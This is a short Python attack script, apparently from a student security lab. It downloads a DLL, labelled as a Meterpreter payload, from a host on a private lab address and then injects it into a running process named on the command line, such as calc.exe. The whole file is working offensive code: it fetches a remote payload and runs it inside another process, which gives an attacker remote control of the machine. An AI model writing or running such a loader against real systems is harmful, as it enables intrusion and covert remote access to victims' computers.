import argparse
import requests
import time
from dll_injector import DllInjector

url = "http://192.168.56.101:8000/payload.dll"
path = "C:\Test\Python Programmes\LAB_KTLT\dll\payload.dll"

parser = argparse.ArgumentParser()
parser.add_argument('process_name', help='ex: calc.exe')
args = parser.parse_args()

def download_meterpreter_payload():
    r = requests.get(url)
    with open(path, "wb") as f:
        f.write(r.content)
    print("[*] Downloaded")

if __name__ == "__main__":
    download_meterpreter_payload()
    time.sleep(3) # chờ cho chắc
    injector = DllInjector(process_name=args.process_name, path=path)
    injector.execute()

